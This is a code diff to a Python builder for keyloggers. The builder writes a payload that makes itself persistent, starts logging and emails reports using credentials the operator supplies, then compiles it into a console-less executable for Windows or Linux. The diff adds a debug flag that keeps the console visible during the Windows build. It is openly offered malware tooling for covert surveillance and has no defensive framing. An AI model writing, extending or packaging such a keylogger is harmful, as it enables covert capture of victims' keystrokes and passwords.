@@ -11,6 +11,7 @@ def get_arguments():
     parser._optionals.title = "Optional Arguments"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds.", default=120)
     parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
+    parser.add_argument("-d", "--debug", dest="debug", help="Enable Debug Mode", action='store_true')
     parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
 
     required_arguments = parser.add_argument_group('Required Arguments')
@@ -26,8 +27,11 @@ def create_keylogger(file_name, interval, email, password):
         file.write("zlogger.become_persistent()\n")
         file.write("zlogger.start()\n")
 
-def compile_for_windows(file_name):
-    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])
+def compile_for_windows(file_name, debug):
+    splist = ["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name]
+    if debug:
+        splist.pop(3)
+    subprocess.call(splist)
 
 def compile_for_linux(file_name):
     subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])
@@ -36,7 +40,7 @@ arguments = get_arguments()
 create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password)
 
 if arguments.windows:
-    compile_for_windows(arguments.out)
+    compile_for_windows(arguments.out, arguments.debug)
 
 if arguments.linux:
     compile_for_linux(arguments.out)
